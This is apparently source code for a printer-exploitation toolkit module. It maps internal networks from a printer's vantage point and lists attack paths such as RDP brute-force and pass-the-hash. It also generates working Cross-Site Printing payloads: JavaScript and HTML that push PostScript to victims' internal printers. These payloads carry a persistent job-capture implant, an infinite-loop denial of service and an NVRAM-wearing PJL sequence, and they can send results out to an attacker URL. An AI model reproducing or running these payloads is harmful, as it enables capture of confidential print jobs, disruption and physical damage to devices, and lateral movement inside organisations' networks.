#!/usr/bin/env python3
"""
PrinterXPL-Forge — Network Mapper (Printer-Perspective)
=====================================================
Maps everything reachable FROM the printer's network position.

A network printer sits inside the LAN — often on a trusted segment, behind
firewalls that only block inbound connections from outside. This module uses
the printer itself as a recon platform to map the internal network.

Techniques used:
  A. SNMP-based network info  — routing table, ARP cache, interface list,
                                connected subnets, DNS servers
  B. SSRF-based host/port scan — IPP print-by-reference timing analysis
  C. PJL network variables     — IP config, WINS, gateway, DNS, DHCP lease
  D. PS/IPP route query        — PostScript systemdict network info
  E. Web interface network config page scraping
  F. WSD device listing        — other WSD devices on the same segment
  G. mDNS/Bonjour neighbors    — devices announcing on multicast
  H. CORS spoofing payload gen — JavaScript XSP payload for web attacker
  I. Windows Spooler recon     — SMB-based print server discovery

Attack surface extensions from printer position:
  - Reach internal web apps (HTTP to private IPs)
  - Probe internal SMB shares (via SMB module)
  - Access NAS/storage devices on the same subnet
  - Enumerate other printers on the network
  - Access management interfaces (router, switch, firewall, cameras)
  - Pivot to cloud print services (Google Cloud Print, AirPrint relay)
"""

# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike


import ipaddress
import logging
import re
import socket
import struct
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

import requests
import urllib3

urllib3.disable_warnings()

_log = logging.getLogger(__name__)

# ── Data structures ───────────────────────────────────────────────────────────

@dataclass
class NetworkHost:
    """A host discovered from the printer's network perspective."""
    ip:         str
    hostname:   str   = ''
    mac:        str   = ''
    open_ports: list[int]        = field(default_factory=list)
    services:   dict[str, str]   = field(default_factory=dict)
    device_type: str             = ''    # printer, router, server, camera, etc.
    os_hint:    str              = ''
    via:        str              = ''    # discovery method

    def __str__(self) -> str:
        svc = ', '.join(f"{p}({v})" for p, v in self.services.items())
        return f"{self.ip} [{self.device_type}] {self.hostname} ports={self.open_ports} {svc}"


@dataclass
class NetworkMap:
    """Complete network map built from the printer's vantage point."""
    printer_ip:     str
    printer_iface:  str   = ''    # interface/subnet the printer is on
    gateway:        str   = ''
    dns_servers:    list[str]       = field(default_factory=list)
    ntp_servers:    list[str]       = field(default_factory=list)
    netmask:        str   = ''
    hosts:          list[NetworkHost] = field(default_factory=list)
    subnets:        list[str]       = field(default_factory=list)
    other_printers: list[str]       = field(default_factory=list)
    attack_paths:   list[str]       = field(default_factory=list)

    def summary(self) -> str:
        return (f"Printer: {self.printer_ip} | Gateway: {self.gateway} | "
                f"DNS: {self.dns_servers} | Hosts found: {len(self.hosts)} | "
                f"Other printers: {len(self.other_printers)}")


# ── Known service ports ───────────────────────────────────────────────────────

COMMON_PORTS = {
    21:   'FTP',
    22:   'SSH',
    23:   'Telnet',
    25:   'SMTP',
    53:   'DNS',
    80:   'HTTP',
    110:  'POP3',
    135:  'MSRPC',
    139:  'NetBIOS',
    143:  'IMAP',
    161:  'SNMP',
    389:  'LDAP',
    443:  'HTTPS',
    445:  'SMB',
    514:  'Syslog',
    515:  'LPD',
    548:  'AFP',
    554:  'RTSP',
    631:  'IPP',
    636:  'LDAPS',
    873:  'rsync',
    902:  'VMware',
    1433: 'MSSQL',
    1723: 'PPTP',
    2049: 'NFS',
    3306: 'MySQL',
    3389: 'RDP',
    3702: 'WSD',
    4848: 'GlassFish',
    5000: 'UPnP',
    5357: 'WSD-HTTP',
    5432: 'PostgreSQL',
    5900: 'VNC',
    5985: 'WinRM',
    6379: 'Redis',
    7070: 'WebLogic',
    8080: 'HTTP-Alt',
    8443: 'HTTPS-Alt',
    8888: 'HTTP-Alt2',
    9100: 'RAW/PJL',
    27017:'MongoDB',
    49152:'UPnP-Dynamic',
}

PRINTER_SIGNATURES = {
    9100: 'RAW/PJL printer',
    631:  'IPP printer',
    515:  'LPD printer',
    443:  'Possible printer webUI',
    80:   'Possible printer webUI',
}

DEVICE_TYPE_HINTS = {
    'router':   [80, 443, 23, 22],
    'switch':   [80, 443, 23, 22, 161],
    'printer':  [9100, 631, 515, 80],
    'camera':   [554, 80, 443, 8080],
    'nas':      [445, 139, 2049, 548, 80],
    'server':   [22, 3389, 5985, 135],
    'database': [3306, 5432, 1433, 27017, 6379],
}


# ── A. SNMP network information ────────────────────────────────────────────────

def _snmp_get(host: str, oid: str, community: str = 'public',
              timeout: float = 3) -> str:
    """Get a single SNMP OID value."""
    try:
        from pysnmp.hlapi import (
            getCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity, SnmpEngine,
        )
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)
        for err_ind, err_stat, _, binds in getCmd(
            SnmpEngine(),
            CommunityData(community, mpModel=1),
            UdpTransportTarget((host, 161), timeout=timeout, retries=0),
            ContextData(),
            ObjectType(ObjectIdentity(oid)),
        ):
            if not err_ind and not err_stat and binds:
                return str(binds[0][1])
    except Exception:
        pass
    return ''


def _snmp_walk(host: str, base_oid: str, community: str = 'public',
               timeout: float = 3, max_rows: int = 200) -> dict[str, str]:
    """Walk SNMP subtree and return {oid: value}."""
    result = {}
    try:
        from pysnmp.hlapi import (
            nextCmd, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity, SnmpEngine,
        )
        import warnings
        warnings.filterwarnings('ignore', category=RuntimeWarning)
        for err_ind, err_stat, _, binds in nextCmd(
            SnmpEngine(),
            CommunityData(community, mpModel=1),
            UdpTransportTarget((host, 161), timeout=timeout, retries=0),
            ContextData(),
            ObjectType(ObjectIdentity(base_oid)),
            lexicographicMode=False,
            maxRows=max_rows,
        ):
            if err_ind or err_stat:
                break
            for oid, val in binds:
                result[str(oid)] = str(val)
    except Exception:
        pass
    return result


def snmp_network_info(host: str, timeout: float = 5) -> dict:
    """
    Extract all network configuration from printer via SNMP.

    Returns dict with: gateway, netmask, dns_servers, ntp, interfaces,
    arp_table, routing_table, hostname, mac addresses.
    """
    info = {
        'gateway':       '',
        'netmask':       '',
        'dns_servers':   [],
        'ntp_servers':   [],
        'hostname':      '',
        'interfaces':    [],
        'arp_table':     [],
        'routing_table': [],
        'wins':          '',
        'domain':        '',
    }

    # Gateway (default route via ipRouteTable)
    routes = _snmp_walk(host, '1.3.6.1.2.1.4.21', timeout=timeout)
    for oid, val in routes.items():
        # ipRouteNextHop
        if '1.3.6.1.2.1.4.21.1.7.' in oid and val not in ('0.0.0.0', ''):
            info['gateway'] = val

    # Interfaces
    ifaces = _snmp_walk(host, '1.3.6.1.2.1.2.2.1', timeout=timeout)
    seen_ifaces: set[str] = set()
    for oid, val in ifaces.items():
        if '1.3.6.1.2.1.2.2.1.6.' in oid and len(val) > 2:  # ifPhysAddress (MAC)
            mac = ':'.join(val[i:i+2] for i in range(0, len(val.replace(' ', '')), 2)
                           if val.replace(' ', ''))[:17]
            if mac not in seen_ifaces:
                seen_ifaces.add(mac)
                info['interfaces'].append({'mac': mac})
        elif '1.3.6.1.2.1.2.2.1.2.' in oid:  # ifDescr
            info['interfaces'].append({'name': val})

    # ARP table (ipNetToPhysicalTable or ipNetToMediaTable)
    arp = _snmp_walk(host, '1.3.6.1.2.1.4.22.1', timeout=timeout)
    for oid, val in arp.items():
        if '1.3.6.1.2.1.4.22.1.3.' in oid:  # ipNetToMediaNetAddress
            info['arp_table'].append(val)

    # IP addresses
    ip_table = _snmp_walk(host, '1.3.6.1.2.1.4.20.1', timeout=timeout)
    for oid, val in ip_table.items():
        if '1.3.6.1.2.1.4.20.1.3.' in oid:  # ipAdEntNetMask
            info['netmask'] = val
            break

    # Hostname
    info['hostname'] = _snmp_get(host, '1.3.6.1.2.1.1.5.0', timeout=timeout)

    # DNS servers (vendor-specific MIBs)
    # HP Jetdirect DNS
    for oid in ['1.3.6.1.4.1.11.2.4.3.7.9.0',   # HP primary DNS
                '1.3.6.1.4.1.11.2.4.3.7.10.0']:   # HP secondary DNS
        val = _snmp_get(host, oid, timeout=timeout)
        if val and val not in ('0.0.0.0', ''):
            info['dns_servers'].append(val)

    # Generic DNS (ipDNS, rfc1213-mib2)
    for oid in ['1.3.6.1.2.1.4.20.1.1.0',
                '1.3.6.1.4.1.2699.1.1.1.1.1.1.3.1.1.0']:
        val = _snmp_get(host, oid, timeout=timeout)
        if val and re.match(r'\d+\.\d+\.\d+\.\d+', val):
            if val not in info['dns_servers']:
                info['dns_servers'].append(val)

    return info


# ── B. PJL network variables ──────────────────────────────────────────────────

PJL_NETWORK_VARS = [
    'IP ADDRESS', 'SUBNET MASK', 'DEFAULT GATEWAY', 'WINS SERVER',
    'PRIMARY DNS', 'SECONDARY DNS', 'DHCP', 'HOSTNAME', 'DOMAIN NAME',
    'MAC ADDRESS', 'IPV6 ADDRESS', 'NTP SERVER', 'SYSLOG SERVER',
    'SMTP SERVER', 'PROXY SERVER', 'PROXY PORT',
]


def pjl_network_info(host: str, timeout: float = 10) -> dict[str, str]:
    """
    Extract network configuration from printer via PJL network variables.

    Returns dict of {variable: value}.
    """
    info = {}
    UEL  = b'\x1b%-12345X'

    # Build query for all network variables
    cmds = [UEL + b'@PJL\r\n']
    for var in PJL_NETWORK_VARS:
        cmds.append(b'@PJL INFO VARIABLES\r\n')
        cmds.append(f'@PJL ECHO "{var}"\r\n'.encode())

    # Also query specific well-known PJL variables
    cmds.append(b'@PJL INFOINIT\r\n')
    cmds.append(b'@PJL INFO NETINFO\r\n')
    cmds.append(UEL)

    from utils.ports import PortConfig as _PC
    try:
        s = socket.create_connection((host, _PC.resolve('raw')), timeout=timeout)
        s.settimeout(timeout)
        for cmd in cmds:
            s.sendall(cmd)
        time.sleep(1.5)
        data = b''
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
            except (TimeoutError, BlockingIOError):
                break
        s.close()

        text = data.decode('latin-1', errors='replace')
        # Parse key=value pairs
        for line in text.splitlines():
            for var in PJL_NETWORK_VARS:
                if var in line.upper():
                    parts = line.split('=', 1)
                    if len(parts) == 2:
                        info[var.lower().replace(' ', '_')] = parts[1].strip()[:60]
    except Exception as exc:
        _log.debug("PJL network info: %s", exc)

    return info


# ── C. Web interface network config scraping ──────────────────────────────────

WEB_NETWORK_PAGES = [
    '/hp/device/info',                           # HP
    '/PRESENTATION/HTML/TOP/PRTINFO.HTML',       # EPSON
    '/info', '/status', '/config', '/network',
    '/cgi-bin/config.cgi', '/cgi-bin/network.cgi',
    '/admin/network', '/admin/netconfig',
    '/webArch/getInfo.cgi',                      # Ricoh
    '/DevMgmt/NetworkConfig.xml',                # HP XML
    '/xml/dev_status.xml',
    '/sys/cfg/network.htm',                      # Kyocera
    '/general/status.xml',
]

IP_PATTERN = re.compile(
    r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
    r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'
)


def web_network_info(host: str, timeout: float = 8) -> dict:
    """
    Scrape network configuration from printer web interface.

    Extracts IPs, MACs, hostnames, and network settings from web pages.
    Returns dict with extracted network details.
    """
    info = {
        'ips_found':    set(),
        'macs_found':   set(),
        'gateway_hint': '',
        'dns_hint':     '',
        'raw_pages':    [],
    }

    for scheme in ('http', 'https'):
        port = 443 if scheme == 'https' else 80
        for path in WEB_NETWORK_PAGES:
            try:
                r = requests.get(
                    f'{scheme}://{host}:{port}{path}',
                    timeout=timeout, verify=False,
                )
                if r.status_code != 200:
                    continue

                text = r.text
                info['raw_pages'].append({'path': path, 'content': text[:500]})

                # Extract all IPs
                for ip in IP_PATTERN.findall(text):
                    if not ip.startswith('127.') and ip != '0.0.0.0':
                        info['ips_found'].add(ip)

                # Extract MACs
                for mac in re.findall(
                    r'([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}', text
                ):
                    info['macs_found'].add(mac[0])  # regex group

                # Gateway patterns
                for pat in [r'[Gg]ateway[:\s]+(' + IP_PATTERN.pattern + ')',
                             r'[Gg]W[:\s]+(' + IP_PATTERN.pattern + ')']:
                    m = re.search(pat, text)
                    if m:
                        info['gateway_hint'] = m.group(1)

                # DNS patterns
                for pat in [r'DNS[:\s]+(' + IP_PATTERN.pattern + ')',
                             r'[Nn]ame[Ss]erver[:\s]+(' + IP_PATTERN.pattern + ')']:
                    m = re.search(pat, text)
                    if m:
                        info['dns_hint'] = m.group(1)

            except Exception:
                pass

    info['ips_found']  = list(info['ips_found'])
    info['macs_found'] = list(info['macs_found'])
    return info


# ── D. Host discovery and service enumeration ─────────────────────────────────

def _tcp_probe(ip: str, port: int, timeout: float) -> bool:
    """Return True if TCP port is open on ip."""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except OSError:
        return False


def _banner_grab(ip: str, port: int, timeout: float = 2) -> str:
    """Grab a basic TCP banner."""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        # Send HTTP probe for web ports
        if port in (80, 443, 8080, 8443):
            try:
                s.sendall(b'HEAD / HTTP/1.0\r\nHost: ' + ip.encode() + b'\r\n\r\n')
            except Exception:
                pass
        try:
            banner = s.recv(256).decode('latin-1', errors='replace').strip()
        except Exception:
            banner = ''
        s.close()
        return banner[:100]
    except Exception:
        return ''


def _guess_device_type(open_ports: list[int]) -> str:
    """Guess device type from open ports."""
    port_set = set(open_ports)
    if port_set & {9100, 631, 515}:
        return 'printer'
    if port_set & {554, 8554}:
        return 'camera/dvr'
    if port_set & {445, 2049, 548}:
        return 'nas/fileserver'
    if port_set & {3306, 5432, 1433, 27017}:
        return 'database'
    if port_set & {22, 3389, 5985}:
        return 'server'
    if len(port_set & {80, 443, 23}) >= 2:
        return 'router/switch'
    return 'unknown'


def scan_host(
    ip:      str,
    ports:   list[int] = None,
    timeout: float     = 1.5,
) -> NetworkHost | None:
    """
    Probe a single host for open ports and return a NetworkHost or None.
    """
    if ports is None:
        ports = sorted(COMMON_PORTS.keys())

    open_ports = []
    services   = {}

    for port in ports:
        if _tcp_probe(ip, port, timeout):
            open_ports.append(port)
            svc_name = COMMON_PORTS.get(port, f'port-{port}')
            services[port] = svc_name

    if not open_ports:
        return None

    # Grab banners for key ports
    host = NetworkHost(ip=ip, open_ports=open_ports, services=services)
    host.device_type = _guess_device_type(open_ports)

    # Reverse DNS
    try:
        host.hostname = socket.gethostbyaddr(ip)[0]
    except Exception:
        pass

    return host


def discover_network(
    printer_ip:  str,
    subnet:      str        = None,
    ports:       list[int]  = None,
    timeout:     float      = 0.8,
    workers:     int        = 50,
    verbose:     bool       = True,
) -> list[NetworkHost]:
    """
    Scan the printer's subnet for live hosts and open services.

    This runs directly from the scanner host (not via SSRF) to map
    what the printer can reach from its network position.

    Args:
        subnet:  CIDR (e.g. '192.168.1.0/24'). Auto-derived from printer_ip if None.
        ports:   Ports to probe per host. Uses a focused set if None.
        workers: Parallel threads for scanning (default 50 for speed).
        timeout: TCP connect timeout in seconds (default 0.8s — fast LAN scan).
    """
    if subnet is None:
        parts   = printer_ip.rsplit('.', 1)
        subnet  = parts[0] + '.0/24'

    if ports is None:
        # Focused set covering the most impactful services — fast scan
        ports = [22, 23, 80, 135, 139, 443, 445, 515, 548, 554,
                 631, 3389, 5900, 5985, 8080, 8443, 9100, 27017]

    try:
        network = ipaddress.ip_network(subnet, strict=False)
    except ValueError:
        _log.error("Invalid subnet: %s", subnet)
        return []

    hosts_found = []
    all_ips = [str(ip) for ip in network.hosts() if str(ip) != printer_ip]

    if verbose:
        print(f"  [MAP] Scanning {len(all_ips)} hosts in {subnet} "
              f"({len(ports)} ports, {workers} threads, {timeout}s timeout) ...")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(scan_host, ip, ports, timeout): ip for ip in all_ips}
        for f in as_completed(futures):
            host = f.result()
            if host:
                hosts_found.append(host)
                if verbose:
                    print(f"  [MAP]   \033[1;32m{host.ip:18}\033[0m "
                          f"[{host.device_type:<12}] "
                          f"ports={host.open_ports} "
                          f"{host.hostname[:30]}")

    return sorted(hosts_found, key=lambda h: ipaddress.ip_address(h.ip))


# ── E. WSD neighbor discovery ─────────────────────────────────────────────────

def wsd_discover(host: str, timeout: float = 5) -> list[dict]:
    """
    Send WSD Probe (UDP multicast or unicast) to discover WSD-enabled devices.

    WSD (Web Services for Devices) uses UDP multicast on 239.255.255.250:3702.
    Returns list of device dicts found.
    """
    import uuid as _uuid

    devices = []
    probe = f"""<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://docs.oasis-open.org/ws-dd/ns/discovery/2009/01">
  <s:Header>
    <a:Action>http://docs.oasis-open.org/ws-dd/ns/discovery/2009/01/Probe</a:Action>
    <a:MessageID>urn:uuid:{_uuid.uuid4()}</a:MessageID>
    <a:To>urn:docs-oasis-open-org:ws-dd:ns:discovery:2009:01</a:To>
  </s:Header>
  <s:Body>
    <d:Probe>
      <d:Types>wsdp:Device</d:Types>
    </d:Probe>
  </s:Body>
</s:Envelope>"""

    # Unicast WSD probe to discovered hosts
    parts = host.rsplit('.', 1)
    subnet_base = parts[0] if len(parts) == 2 else host

    for i in range(1, 20):
        ip = f"{subnet_base}.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout / 10)
            sock.sendto(probe.encode(), (ip, 3702))
            try:
                data, addr = sock.recvfrom(4096)
                text = data.decode('utf-8', errors='replace')
                device = {'ip': addr[0]}
                for tag in ['wsdp:Name', 'd:Types', 'wsdp:Manufacturer']:
                    m = re.search(f'<{tag}>(.*?)</{tag}>', text, re.S)
                    if m:
                        device[tag] = m.group(1).strip()[:60]
                devices.append(device)
            except (TimeoutError, OSError):
                pass
            sock.close()
        except Exception:
            pass

    return devices


# ── F. Cross-Site Printing (XSP) payload generator ────────────────────────────

def generate_xsp_payload(
    printer_ip:    str,
    printer_port:  int  = 0,
    attack_type:   str  = 'info',
    callback_url:  str  = '',
    exfil_url:     str  = '',
) -> dict[str, str]:
    """
    Generate Cross-Site Printing (XSP) + CORS spoofing payloads.

    These JavaScript snippets can be embedded in a malicious web page.
    When a victim visits the page, their browser sends PostScript/PJL
    to internal printer port 9100 via XMLHttpRequest.

    Attack types:
      'info'     — retrieve printer model via CORS spoofing
      'capture'  — inject print job capture PostScript
      'dos'      — inject infinite loop DoS
      'exfil'    — retrieve captured jobs and send to attacker URL

    Args:
        printer_ip:   Target printer IP (discovered via WebRTC or subnet scan).
        callback_url: Attacker URL to receive exfiltrated data.
        exfil_url:    URL to send captured job data to.

    Returns:
        dict with 'html', 'javascript', 'postscript', 'pjl' payloads.
    """
    from utils.ports import PortConfig as _PC
    if not printer_port:
        printer_port = _PC.resolve('raw')
    UEL = r'\x1b%-12345X'

    # PostScript for CORS spoofing — printer acts as HTTP server
    cors_ps = (
        f"{UEL}\r\n"
        f"%!\r\n"
        f"(HTTP/1.0 200 OK\\n) print\r\n"
        f"(Server: PostScript-HTTPD\\n) print\r\n"
        f"(Access-Control-Allow-Origin: *\\n) print\r\n"
        f"(Connection: close\\n) print\r\n"
        f"(Content-Type: text/plain\\n) print\r\n"
        f"(Content-Length: ) print\r\n"
        f"product dup length string cvs print\r\n"
        f"(\\n\\n) print\r\n"
        f"product print\r\n"
        f"(\\nFirmware: ) print\r\n"
        f"version print\r\n"
        f"(\\nRevision: ) print\r\n"
        f"revision 16 string cvs print\r\n"
        f"(\\n) print flush\r\n"
        f"{UEL}\r\n"
    )

    # PostScript capture malware
    capture_ps = (
        f"{UEL}\r\n"
        f"%!\r\n"
        f"serverdict begin 0 exitserver\r\n"
        f"/permanent {{/currentfile {{serverdict begin 0 exitserver}} def}} def\r\n"
        f"permanent /filter {{\r\n"
        f"  /rndname (job_) rand 16 string cvs strcat (.ps) strcat def\r\n"
        f"  false echo\r\n"
        f"  /newjob true def\r\n"
        f"  currentdict /currentfile undef\r\n"
        f"  /max 40000 def\r\n"
        f"  /slots max array def\r\n"
        f"  /counter 2 dict def\r\n"
        f"  counter (slot) 0 put\r\n"
        f"  counter (line) 0 put\r\n"
        f"  (capturedict) where {{pop}}\r\n"
        f"  {{/capturedict max dict def}} ifelse\r\n"
        f"  capturedict rndname slots put\r\n"
        f"  /capture {{\r\n"
        f"    linenum 0 eq {{\r\n"
        f"      /lines max array def\r\n"
        f"      slots slotnum lines put\r\n"
        f"    }} if\r\n"
        f"    dup lines exch linenum exch put\r\n"
        f"    counter (line) linenum 1 add put\r\n"
        f"  }} def\r\n"
        f"  {{ newjob {{(%!\\ncurrentfile /ASCII85Decode filter ) capture\r\n"
        f"    pop /newjob false def}} if\r\n"
        f"    (%lineedit) (r) file\r\n"
        f"    dup bytesavailable string readstring pop capture pop\r\n"
        f"  }} loop\r\n"
        f"}} def\r\n"
        f"{UEL}\r\n"
    )

    # DoS — infinite loop
    dos_ps = (
        f"{UEL}\r\n"
        f"%!\r\n"
        f"serverdict begin 0 exitserver\r\n"
        f"{{}} loop\r\n"
        f"{UEL}\r\n"
    )

    # PJL physical damage (NVRAM exhaustion)
    nvram_damage_pjl = (
        f"{UEL}\r\n"
        f"@PJL\r\n"
        + ''.join(f"@PJL DEFAULT COPIES={i}\r\n" for i in range(1, 1000))
        + f"{UEL}\r\n"
    )

    payload_map = {
        'info':    cors_ps,
        'capture': capture_ps,
        'dos':     dos_ps,
        'nvram':   nvram_damage_pjl,
    }
    chosen_ps = payload_map.get(attack_type, cors_ps)

    # JavaScript XSP payload
    js_payload = f"""
// PrinterXPL-Forge XSP + CORS Spoofing Payload
// Target: {printer_ip}:{printer_port}
// Attack: {attack_type}
// WARNING: For authorized penetration testing only.

var printerIP   = "{printer_ip}";
var printerPort = {printer_port};

// Encode the PostScript job
var job = {chosen_ps!r};

function xspSend(ip, port, data, callback) {{
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://" + ip + ":" + port, true);
  xhr.setRequestHeader("Content-Type", "application/octet-stream");
  xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4 && callback) callback(xhr.responseText);
  }};
  try {{ xhr.send(data); }} catch(e) {{ console.log("XSP:", e); }}
}}

// Send the payload
xspSend(printerIP, printerPort, job, function(response) {{
  console.log("Printer response:", response);
  {"// Exfiltrate response to attacker" if exfil_url else ""}
  {"var img = new Image(); img.src = '" + exfil_url + "?d=' + encodeURIComponent(response);" if exfil_url else ""}
}});

// WebRTC-based printer discovery (scan subnet)
function discoverPrinters(subnet, callback) {{
  var found = [];
  var pending = 0;
  for (var i = 1; i <= 254; i++) {{
    (function(i) {{
      var ip = subnet + "." + i;
      pending++;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://" + ip + ":{printer_port}", true);
      xhr.timeout = 1500;
      xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
          if (xhr.status === 200 || xhr.responseText.length > 0) {{
            found.push(ip);
          }}
          if (--pending === 0 && callback) callback(found);
        }}
      }};
      xhr.ontimeout = function() {{ if (--pending === 0 && callback) callback(found); }};
      xhr.send("@PJL INFO ID\\r\\n");
    }})(i);
  }}
}}
"""

    # HTML wrapper
    html_payload = f"""<!DOCTYPE html>
<html>
<head><title>XSP Demo</title></head>
<body>
<script>
{js_payload}
</script>
<p>Cross-Site Printing test page (authorized pentest only)</p>
</body>
</html>"""

    return {
        'html':        html_payload,
        'javascript':  js_payload,
        'postscript':  chosen_ps,
        'pjl':         nvram_damage_pjl,
    }


# ── G. Full network map ────────────────────────────────────────────────────────

def build_network_map(
    printer_host: str,
    subnet:       str   = None,
    timeout:      float = 5,
    scan_ports:   list[int] = None,
    workers:      int   = 60,
    verbose:      bool  = True,
) -> NetworkMap:
    """
    Build a complete network map using the printer as the reference point.

    Combines SNMP, PJL, web scraping, and direct TCP scanning to map
    everything reachable from the printer's network segment.

    Returns a NetworkMap with all discovered hosts and attack paths.
    """
    nm = NetworkMap(printer_ip=printer_host)

    if verbose:
        print(f"\n  [NETMAP] Building network map from printer {printer_host}")

    # 1. SNMP network info
    if verbose:
        print("  [NETMAP] 1/5 SNMP network info ...")
    snmp_info = snmp_network_info(printer_host, timeout)
    nm.gateway     = snmp_info.get('gateway', '')
    nm.netmask     = snmp_info.get('netmask', '')
    nm.dns_servers = snmp_info.get('dns_servers', [])
    if verbose and nm.gateway:
        print(f"  [NETMAP]   Gateway:     {nm.gateway}")
        print(f"  [NETMAP]   Netmask:     {nm.netmask}")
        print(f"  [NETMAP]   DNS:         {nm.dns_servers}")

    # 2. PJL network variables
    if verbose:
        print("  [NETMAP] 2/5 PJL network variables ...")
    pjl_info = pjl_network_info(printer_host, timeout)
    if pjl_info.get('default_gateway') and not nm.gateway:
        nm.gateway = pjl_info['default_gateway']
    if verbose and pjl_info:
        for k, v in list(pjl_info.items())[:5]:
            print(f"  [NETMAP]   PJL {k}: {v}")

    # 3. Web network config
    if verbose:
        print("  [NETMAP] 3/5 Web interface scraping ...")
    web_info = web_network_info(printer_host, timeout)
    if web_info.get('gateway_hint') and not nm.gateway:
        nm.gateway = web_info['gateway_hint']
    # Add all IPs found in web pages as potential hosts
    for ip in web_info.get('ips_found', []):
        if ip != printer_host:
            nm.attack_paths.append(f"IP from web page: {ip}")

    # 4. Derive subnet and scan
    if subnet is None:
        if nm.gateway:
            subnet = nm.gateway.rsplit('.', 1)[0] + '.0/24'
        elif nm.netmask:
            try:
                net = ipaddress.ip_network(
                    f"{printer_host}/{nm.netmask}", strict=False
                )
                subnet = str(net)
            except Exception:
                subnet = printer_host.rsplit('.', 1)[0] + '.0/24'
        else:
            subnet = printer_host.rsplit('.', 1)[0] + '.0/24'
    nm.subnets = [subnet]

    if verbose:
        print(f"  [NETMAP] 4/5 Scanning {subnet} ...")
    hosts = discover_network(printer_host, subnet, scan_ports, 0.8,
                             workers, verbose)
    nm.hosts = hosts

    # Identify other printers
    nm.other_printers = [h.ip for h in hosts if h.device_type == 'printer']

    # 5. Build attack paths
    if verbose:
        print("  [NETMAP] 5/5 Mapping attack paths ...")
    _build_attack_paths(nm)

    if verbose:
        print(f"\n  [NETMAP] Done: {len(hosts)} hosts, "
              f"{len(nm.other_printers)} other printers, "
              f"{len(nm.attack_paths)} attack paths")

    return nm


def _build_attack_paths(nm: NetworkMap) -> None:
    """Populate nm.attack_paths based on discovered hosts and services."""
    for host in nm.hosts:
        ports = set(host.open_ports)
        ip    = host.ip

        # RDP — direct access to Windows systems
        if 3389 in ports:
            nm.attack_paths.append(
                f"RDP brute-force: {ip}:3389 [{host.device_type}] "
                f"→ lateral movement to Windows host"
            )
        # SMB — file shares, pass-the-hash
        if 445 in ports:
            nm.attack_paths.append(
                f"SMB attack: {ip}:445 [{host.device_type}] "
                f"→ file access, pass-the-hash, lateral movement"
            )
        # Other printers — chain attack
        if host.device_type == 'printer':
            nm.attack_paths.append(
                f"Chain attack: {ip} [printer] "
                f"→ exploit via PJL/PS to reach its network segment"
            )
        # Databases
        if ports & {3306, 5432, 1433, 27017}:
            db_ports = [str(p) for p in sorted(ports & {3306, 5432, 1433, 27017})]
            nm.attack_paths.append(
                f"Database: {ip}:{','.join(db_ports)} "
                f"→ credential brute-force or unauthenticated access"
            )
        # Web management interfaces
        if ports & {80, 443, 8080, 8443} and host.device_type in ('router/switch', 'unknown'):
            nm.attack_paths.append(
                f"Web management: {ip} "
                f"→ default credentials, CVE exploitation"
            )
        # SSH
        if 22 in ports:
            nm.attack_paths.append(
                f"SSH: {ip}:22 → brute-force or key re-use"
            )
        # NAS
        if host.device_type == 'nas/fileserver':
            nm.attack_paths.append(
                f"NAS: {ip} → access shares, extract data via SMB/NFS/AFP"
            )


def print_network_map(nm: NetworkMap) -> None:
    """Pretty-print a NetworkMap to stdout."""
    print(f"\n{'='*70}")
    print(f"  NETWORK MAP — from printer {nm.printer_ip}")
    print(f"{'='*70}")
    print(f"  Gateway    : {nm.gateway or '?'}")
    print(f"  Netmask    : {nm.netmask or '?'}")
    print(f"  DNS servers: {', '.join(nm.dns_servers) or '?'}")
    print(f"  Subnet(s)  : {', '.join(nm.subnets)}")

    if nm.hosts:
        print(f"\n  DISCOVERED HOSTS ({len(nm.hosts)})")
        print(f"  {'IP':<18} {'TYPE':<15} {'OPEN PORTS'}")
        print(f"  {'-'*65}")
        for h in nm.hosts:
            ports_str = ', '.join(f"{p}({nm.hosts[0].services.get(p,'?')})"
                                  for p in h.open_ports[:6])
            print(f"  \033[1;32m{h.ip:<18}\033[0m {h.device_type:<15} {ports_str}")
            if h.hostname:
                print(f"  {'':18} hostname: {h.hostname}")

    if nm.other_printers:
        print(f"\n  OTHER PRINTERS FOUND: {', '.join(nm.other_printers)}")

    if nm.attack_paths:
        print(f"\n  ATTACK PATHS ({len(nm.attack_paths)})")
        print(f"  {'-'*65}")
        for path in nm.attack_paths[:20]:
            print(f"  \033[1;33m[→]\033[0m {path}")
    print()
